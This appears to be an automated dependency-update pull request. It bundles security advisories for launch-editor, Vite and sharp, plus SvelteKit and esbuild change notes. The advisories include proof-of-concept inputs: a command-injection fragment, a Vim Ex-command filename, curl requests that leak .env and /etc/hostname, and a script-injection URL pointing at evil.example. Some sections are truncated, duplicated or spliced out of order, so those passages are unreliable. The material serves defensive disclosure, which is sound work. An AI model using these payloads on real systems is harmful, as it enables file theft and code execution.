subcommand (e.g. `&calc.exe `), they can call `launchEditor` with
`./%CD%`

#### Severity
- CVSS Score: 6.3 / 10 (Medium)
- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N`

### launch-editor: `fs.existsSync()` existence check can be bypassed on
Windows
[CVE-2026-112942](https://nvd.nist.gov/vuln/detail/CVE-2026-112942) /
[GHSA-587h-7wmj-h5pm](https://redirect.github.com/advisories/GHSA-587h-7wmj-h5pm)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` checked `fs.existsSync(fileName)` before passing a
supplied path to an editor command. On Windows, an attacker can bypass
this check with a crafted path ending in `\\..:line:column`. This
removes the requirement that the attacker be able to place a file with a
malicious filename.

Combined with the `%` escaping issue described in
[GHSA-698v-4r3x-3vcv](https://redirect.github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv),
this bypass can lead to OS command injection when an attacker controls
the file argument.

##### Impact

Only apps that runs on Windows is affected.

##### Details

The earlier advisory assumed that `fs.existsSync()` required an
attacker-controlled filename to exist. This advisory covers a bypass of
that requirement.

A crafted value ending in `\\..:1:1` is interpreted differently by
`launch-editor-middleware`, `launch-editor`, and Windows:

1. `launch-editor-middleware` calls `path.resolve()` while the final
path component is `..:1:1`, so it is not treated as a parent-directory
component.
2. `launch-editor` treats `:1:1` as a line-and-column suffix and removes
it, leaving a path ending in `\\..`.
3. On Windows, `fs.existsSync()` accepts the resulting path as the
existing parent directory even though the attacker-controlled preceding
component does not exist.
4. Because the existence check passes, the crafted filename reaches the
Windows shell command.

#### Severity
- CVSS Score: 7.5 / 10 (High)
- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`

### launch-editor: Editor CLI flag misinterpretation causing arbitrary
command execution for some editors
[CVE-2026-112944](https://nvd.nist.gov/vuln/detail/CVE-2026-112944) /
[GHSA-r825-w8mm-5pxw](https://redirect.github.com/advisories/GHSA-r825-w8mm-5pxw)

<details>
<summary>More information</summary>

#### Details
##### Summary

`launch-editor` forwarded file paths directly to editors without
sanitization. If a path resembles a CLI flag, editors like Vim may
interpret it as a command, potentially causing unintended file
overwrites or command execution.

##### Impact

##### Direct `launch-editor` users

Only apps that match all of the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- The first argument of `launchEditor` can start with `+` or `-` or the
user is using WSL

##### `launch-editor-middleware` users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- launch-editor older than v2.2.0 is used, or the user is using WSL

##### Vite users

Only apps that match the following conditions are affected:

- The attacker is able to create a file system entry (e.g. a file or
directory) starting with `+` or `-` in the working directory
- The user uses or the app specifies any of the following editors:
  - Vim (including gVim)
  - MacVim
  - Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)
- The user is using WSL

##### Details

`launchEditor(file)` function passes the file name as-is to the editor
if the file with that file name exists. If the file name starts with `-`
(also `+` for Vim), the editor treats them as flags rather than
positional arguments. For example, Vim treats arguments starting with
`+` as an Ex command. As a result, an existing relative directory such
as:
```
+call writefile(["SAFE_MARKER"],"LAUNCH_EDITOR_MARKER")|qa!
```
is not treated as a filename when passed to Vim. Vim executes the
embedded Ex command.

The following editor has a potentially destructive operation exposed to
the CLI arguments:
- Vim (including gVim)
- MacVim
- Emacs (including Emacsclient)
- Notepad++ (only if using a plugin exposing dangerous operations via
plugin messages)

`launch-editor-middleware` v2.2.0+ converts the passed file path to an
absolute path so those are not affected as long as the user is not using
WSL. For WSL, `launch-editor` converts the paths to relative paths
internally, so those are still affected.

Vite 2.0.0+ uses `launch-editor-middleware` v2.2.0+ so the WSL users are
only affected.

#### Severity

- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N`

### Vite: First 4 bytes of files outside of `server.fs` setting is
exposed by `?vite-wasm-instance`
[CVE-2026-112947](https://nvd.nist.gov/vuln/detail/CVE-2026-112947) /
[GHSA-vfpm-58rq-9qcg](https://redirect.github.com/advisories/GHSA-vfpm-58rq-9qcg)

<details>
<summary>More information</summary>

#### Details
##### Summary

The first 4 bytes of files outside of `server.fs` setting can be
returned to the browser by a request containing `?vite-wasm-instance`.

##### Impact

 Only apps that match one of the following conditions are affected:

- explicitly expose the Vite dev server to the network using `--host` or
the [`server.host`](https://vite.dev/config/server-options#server-host)
option
- there's a file that has a sensitive information in **the first 4
bytes**
- uses Node.js or Deno to run Vite (if Bun is used, it is not affected)

##### Details
Requests containing the `?vite-wasm-instance` query are handled by the
internal Wasm plugin's `load` hook. The hook removes the query and reads
the resulting path directly from disk, but the `server.fs` checks were
not applied.

After reading the file, Vite attempts to parse it as WebAssembly. When
that parse fails, Node and deno throws an error that contains the first
4 bytes of the file.

##### PoC

Create a denied file and start an affected Vite dev server:

```bash
echo 'SECRET_KEY=abc123\n' > .env
npm run dev
curl 'http://localhost:5173/.env?vite-wasm-instance'
```

This will show
```
Failed to parse WASM file "<root>/.env": WebAssembly.compile(): expected magic word 00 61 73 6d, found 53 45 43 52 @+0
```

- Vector String:

### Vite: Files outside `server.fs.allow` could be served when project
paths match system paths on non-Windows machine
[CVE-2026-112946](https://nvd.nist.gov/vuln/detail/CVE-2026-112946) /
[GHSA-rq7h-c2jc-7f22](https://redirect.github.com/advisories/GHSA-rq7h-c2jc-7f22)

<details>
<summary>More information</summary>

#### Details
##### Summary

The content of files outside `server.fs` setting can be returned to the
browser if the project imports a file path concatenated with the `root`.
For example, if the project references
`<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was
possible to be returned.

The content of files outside the `server.fs.allow` option can be
returned to the browser when a project imports a file whose
root-relative path matches an absolute path on the host. For example,
referencing `<project-root>/etc/hosts` could make Vite return the host's
`/etc/hosts` file.

##### Impact

Only apps that meet all of the following conditions are affected:

- explicitly expose the Vite dev server to the network (using `--host`
or the [`server.host`
option](https://vite.dev/config/server-options#server-host))
- contain an imported file whose root-relative browser URL is also the
absolute path of a readable file on the host
- The sensitive file is not matched by
[`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)
- the dev server is not running on Windows

##### Details

When Vite analyzes an in-root import, it rewrites the resolved module ID
to a browser URL such as `/etc/hostname`. In affected versions, Vite
converts that URL with `fsPathFromUrl` and adds the result to
`safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash
without resolving the URL against the project root, the project URL
`/etc/hostname` is recorded as if it were the absolute filesystem path
`/etc/hostname`.

For a later request to `/@fs/etc/hostname`, the raw-filesystem
middleware interprets `/etc/hostname` as an absolute path. The access
check applies `server.fs.deny`, then accepts paths present in
`safeModulePaths` before checking `server.fs.allow`. As a result, the
request can return the host file instead of the project file that
originally populated `safeModulePaths`.

##### PoC
The following example requires Linux with a readable `/etc/hostname`:
```bash
$ mkdir vite-safe-module-path-poc
$ cd vite-safe-module-path-poc
$ npm init -y
$ npm install vite@8.3.1
$ mkdir -p etc
$ echo 'PROJECT-DECOY\n' > etc/hostname
$ echo 'import "./etc/hostname"\n' > main.js
$ npx vite --host 127.0.0.1
```

In another terminal:
```bash
$ curl -o /dev/null -s -w '%{http_code}\n' http://127.0.0.1:5173/main.js
200
$ curl -sS -o response -w '%{http_code}\n' http://127.0.0.1:5173/@fs/etc/hostname
200
$ cmp -s response /etc/hostname && echo 'response matches host file'
response matches host file
```

#### Severity

- Vector String:
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N`

### Vite: Cross origin script execution through Vite custom middleware
[CVE-2026-112945](https://nvd.nist.gov/vuln/detail/CVE-2026-112945) /
[GHSA-9jrq-w75r-8gcw](https://redirect.github.com/advisories/GHSA-9jrq-w75r-8gcw)

<details>
<summary>More information</summary>

#### Details
##### Summary

When accessing a malicious site while a dev server using Vite is
running, that site was able to load scripts in a page served by the dev
server.

##### Impact

Only apps that match the following conditions are affected:

- the dev server passes an unchanged browser request URL to
`server.transformIndexHtml`: this is normally used for
`server.middlewareMode: true` or `appType: 'custom'`. The internal call
for `appType: 'spa'` and `appType: 'mpa'` does not match this.
- the transformed HTML contains an inline module script
- from the script in the page served by the dev server, the app stores
sensitive values in the location accessible or allows critical actions

##### Details

[Vite's SSR guide for
8.2.1](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131)
documents the affected setup. The application embeds Vite in middleware
mode, reads trusted HTML, and passes the browser's unchanged request URL
to the transform:

```js
const url = req.originalUrl
template = await vite.transformIndexHtml(url, template)
```

For a development server at `http://localhost:5173`, an attacker can
send this URL:

```text
http://localhost:5173//evil.example/payload.js?/../../package.json
```

In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in
`indexHtml.ts`](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115)
use the request URL as both the transform `path` and the input to
`path.join`. The value passed to `path.join` still includes its query
text.

Chromium preserves `/../../package.json` because it follows `?` and is
therefore query text. Vite treats the same characters as filesystem path
components, so the `..` components resolve the derived filename to the
existing project `package.json`.

[The existing file branch in
`indexHtml.ts`](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232)
checks that filename with `fs.existsSync`, then preserves the `htmlPath`
supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite
in the same
file](https://redirect.github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278)
writes that value into the generated `src`:

```html
<script type="module" src="//evil.example/payload.js?/../../package.json?html-proxy&index=0.js"></script>
```

The generated value is a valid URL. Its leading `//` tells the browser
to request the module from `evil.example` using the Vite page's scheme.
The attacker returns JavaScript for that request, and Chromium executes
it in the Vite page.

##### PoC

```js
import { createServer as createHttpServer } from 'node:http'
import { createRequire } from 'node:module'
import { dirname, join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const viteModule = await import(

const createViteServer =

const attackerPort = 4173
const exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`

  new Promise((resolve, reject) => {
    server.once('error', reject)
    server.listen(port, '127.0.0.1', () => {
      server.off('error', reject)
      resolve(server.address().port)
    })
  })

const close = (server) =>
  new Promise((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()))
  })

let attackerRequest = null
const attacker = createHttpServer((request, response) => {
  attackerRequest = request.url
  response.writeHead(200, {

})

      response.end(transformed)

    }
```

A memory-related vulnerability has been discovered and fixed in the
upstream librsvg dependency. When certain runtime-specific conditions
apply, this vulnerability can lead to possible remote code execution

##### Using prebuilt binaries provided by sharp?

Most people rely on the prebuilt binaries provided by sharp.

Please upgrade sharp to the latest version, currently 0.35.5, which
provides librsvg 2.63.2.

Please ensure you are using the latest librsvg 2.63.2.

##### Workarounds

Add the following to your code to prevent sharp from decoding SVG
images.
```js
sharp.block({ operation: ["VipsForeignLoadSvg"] });
```

as a Position Independent Executable (PIE). Most Linux package managers
already use this security-hardening feature however be warned that the
"official" Node.js binaries do not.

### sharp : Vulnerability in librsvg dependency CVE-2026-96889

[GHSA-wq5f-xc86-pv6w](https://redirect.github.com/advisories/GHSA-wq5f-xc86-pv6w)

<details>
<summary>More information</summary>

#### Details
##### Impact

A memory-related vulnerability has been discovered and fixed in the
upstream librsvg dependency. When certain runtime-specific conditions
apply, this vulnerability can lead to possible remote code execution
(RCE) on glibc-based Linux.

##### Patches

##### Using prebuilt binaries provided by sharp?

Most people rely on the prebuilt binaries provided by sharp.

Please upgrade sharp to the latest version, currently 0.35.5, which
provides librsvg 2.63.2.

##### Using a globally-installed librsvg?

Please ensure you are using the latest librsvg 2.63.2.

##### Workarounds

Add the following to your code to prevent sharp from decoding SVG
images.
```js
sharp.block({ operation: ["VipsForeignLoadSvg"] });
```

To avoid RCE, ensure you are using a `node` executable binary compiled
as a Position Independent Executable (PIE). Most Linux package managers
already use this security-hardening feature however be warned that the
"official" Node.js binaries do not.

GHSA-GV7G-X59X-WF8F.ff4247e2376862207dd9df7317f39d8bb8dd9ee4:
fix: prerender and crawl pages whose content-type header carries a charset parameter (#16567)

The prerenderer compares `content-type` with `===`, so `text/html;
charset=utf-8` is not treated as HTML: the page is written without a
`.html` extension and its links are never crawled. `is_content_type`
already normalizes the header for this reason, from #7195 (strip
parameters) and GHSA-gv7g-x59x-wf8f (case-insensitive compare); the two
prerender checks predate both.

Reproduces #13612, closed as unreproducible, using the charset
workaround from #3184. The root `+server.js` error added in #15994 is
gated on the same value, so it can fire for an app that has none.

Release notes

Sourced from esbuild's releases.

v0.28.1

  • Disallow \ in local development server HTTP requests (GHSA-g7r4-m6w7-qqqr)

    This release fixes a security issue where HTTP requests to esbuild's local development server could traverse outside of the serve directory on Windows using a \ backslash character. It happened due to the use of Go's path.Clean() function, which only handles Unix-style / characters. HTTP requests with paths containing \ are no longer allowed.

    Thanks to @​dellalibera for reporting this issue.

  • Add integrity checks to the Deno API (GHSA-gv7w-rqvm-qjhr)

    The previous release of esbuild added integrity checks to esbuild's npm install script. This release also adds integrity checks to esbuild's Deno install script. Now esbuild's Deno API will also fail with an error if the downloaded esbuild binary contains something other than the expected content.

    Note that esbuild's Deno API installs from registry.npmjs.org by default, but allows the NPM_CONFIG_REGISTRY environment variable to override this with a custom package registry. This change means that the esbuild executable served by NPM_CONFIG_REGISTRY must now match the expected content.

    Thanks to @​sondt99 for reporting this issue.

  • Avoid inlining using and await using declarations (#4482)

    Previously esbuild's minifier sometimes incorrectly inlined using and await using declarations into subsequent uses of that declaration, which then fails to dispose of the resource correctly. This bug happened because inlining was done for let and const declarations by avoiding doing it for var declarations, which no longer worked when more declaration types were added. Here's an example:

    // Original code
{
  using x = new Resource()
  x.activate()
}

    // Old output (with --minify)
    
new Resource().activate();
    

    // New output (with --minify)
    
{using e=new Resource;e.activate()}

  • Fix module evaluation when an error is thrown (#4461, #4467)

    If an error is thrown during module evaluation, esbuild previously didn't preserve the state of the module for subsequent module references. This was observable if import() or require() is used to import a module multiple times. The thrown error is supposed to be thrown by every call to import() or require(), not just the first. With this release, esbuild will now throw the same error every time you call import() or require() on a module that throws during its evaluation.

  • Fix some edge cases around the new operator (#4477)

    Previously esbuild incorrectly printed certain edge cases involving complex expressions inside the target of a new expression (specifically an optional chain and/or a tagged template literal). The generated code for the new target was not correctly wrapped with parentheses, and either contained a syntax error or had different semantics. These edge cases have been fixed so that they now correctly wrap the new target in parentheses. Here is an example of some affected code:

    // Original code
new (foo()`bar`)()
new (foo()?.bar)()

    // Old output
    
new foo()bar();
    
new (foo())?.bar();

Sourced from esbuild's changelog.

Changelog: 2025

This changelog documents all esbuild versions published in the year 2025 (versions 0.25.0 through 0.27.2).

0.27.2

  • Allow import path specifiers starting with #/ (#4361)

    Previously the specification for package.json disallowed import path specifiers starting with #/, but this restriction has recently been relaxed and support for it is being added across the JavaScript ecosystem. One use case is using it for a wildcard pattern such as mapping #/* to ./src/* (previously you had to use another character such as #_* instead, which was more confusing). There is some more context in nodejs/node#49182.

    This change was contributed by @​hybrist.

  • Automatically add the -webkit-mask prefix (#4357, #4358)

    This release automatically adds the -webkit- vendor prefix for the mask CSS shorthand property:

    /* Original code */
main {
  mask: url(x.png) center/5rem no-repeat
}

    /* Old output (with --target=chrome110) */
    
main {
    
mask: url(x.png) center/5rem no-repeat;
    
}
    

    /* New output (with --target=chrome110) */
    
main {
    
-webkit-mask: url(x.png) center/5rem no-repeat;
    
mask: url(x.png) center/5rem no-repeat;
    
}

    This change was contributed by @​BPJEnnova.

  • Additional minification of switch statements (#4176, #4359)

    This release contains additional minification patterns for reducing switch statements. Here is an example:

    // Original code
switch (x) {
  case 0:
    foo()
    break
  case 1:
  default:
    bar()
}
